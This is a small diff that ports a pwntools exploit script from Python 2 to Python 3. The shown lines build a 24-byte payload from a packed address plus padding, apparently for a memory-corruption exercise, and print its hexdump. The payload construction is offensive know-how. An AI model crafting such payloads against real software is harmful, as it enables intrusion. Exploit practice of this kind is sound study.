@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 import pwn
 
@@ -32,7 +32,7 @@ pwn.context(arch = "i386", os = "linux", log_level='debug')
 random_file = "/tmp/%s" % pwn.util.fiddling.randoms(10)
 size_of_new = 24
 payload_length = size_of_new
-payload = pwn.p32(0x401568) + 'a' * (size_of_new - 4)
+payload = pwn.p32(0x401568) + b'a' * (size_of_new - 4)
 print(pwn.hexdump(payload))
 
 exit(1)
